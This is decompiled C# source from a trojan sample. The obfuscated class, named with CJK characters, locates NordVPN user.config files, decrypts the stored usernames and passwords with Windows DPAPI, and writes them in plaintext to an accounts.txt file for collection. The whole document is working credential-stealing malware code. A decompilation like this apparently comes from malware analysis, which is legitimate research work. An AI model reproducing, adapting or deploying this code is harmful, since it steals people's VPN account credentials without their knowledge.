// Decompiled with JetBrains decompiler
// Type: 廾襾土豆赤臼犬香干臼幺.辰斤冖龜牛自夊虫日齊髟老
// Assembly: correcthit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 98A8C508-DCA7-4494-BD18-281291040E34
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Shelpak.gen-d9c811eae2b07eca77f74ca45e1efee2a2c91add3f8606c489f526eb43f55287.exe

using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;
using 火長宀舛火尸彐方自儿丿广;

namespace 廾襾土豆赤臼犬香干臼幺
{
  internal sealed class 辰斤冖龜牛自夊虫日齊髟老
  {
    private static string 臼羊歹凵走斤生卜己龠网寸止禸鳥(string 厂寸力幺气歹爻女耒耳欠囗卜羽冫)
    {
      try
      {
        return Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(厂寸力幺气歹爻女耒耳欠囗卜羽冫), (byte[]) null, DataProtectionScope.LocalMachine));
      }
      catch
      {
        return "";
      }
    }

    public static void 戶舌巾儿夊厂日骨辵土歹厂(string 止干香斤己寸疒頁女曰夂殳幺)
    {
      DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(屮大几宀白鬯士比豕玄火八父.卜斗革冫无支口彐目聿鹿, "NordVPN"));
      if (!directoryInfo.Exists)
        return;
      try
      {
        Directory.CreateDirectory(止干香斤己寸疒頁女曰夂殳幺);
        foreach (DirectoryInfo directory1 in directoryInfo.GetDirectories("NordVpn.exe*"))
        {
          foreach (DirectoryInfo directory2 in directory1.GetDirectories())
          {
            string str1 = Path.Combine(directory2.FullName, "user.config");
            if (File.Exists(str1))
            {
              Directory.CreateDirectory(止干香斤己寸疒頁女曰夂殳幺 + "\\" + directory2.Name);
              XmlDocument xmlDocument = new XmlDocument();
              xmlDocument.Load(str1);
              string innerText1 = xmlDocument.SelectSingleNode("//setting[@name='Username']/value").InnerText;
              string innerText2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value").InnerText;
              if (innerText1 != null && !string.IsNullOrEmpty(innerText1) && innerText2 != null && !string.IsNullOrEmpty(innerText2))
              {
                string str2 = 辰斤冖龜牛自夊虫日齊髟老.臼羊歹凵走斤生卜己龠网寸止禸鳥(innerText1);
                string str3 = 辰斤冖龜牛自夊虫日齊髟老.臼羊歹凵走斤生卜己龠网寸止禸鳥(innerText2);
                ++丿士止土巾幺山田巾弋宀小.勹龍片犬冖弋色舟艸色心雨;
                File.AppendAllText(止干香斤己寸疒頁女曰夂殳幺 + "\\" + directory2.Name + "\\accounts.txt", "Username: " + str2 + "\nPassword: " + str3 + "\n\n");
              }
            }
          }
        }
      }
      catch
      {
      }
    }
  }
}
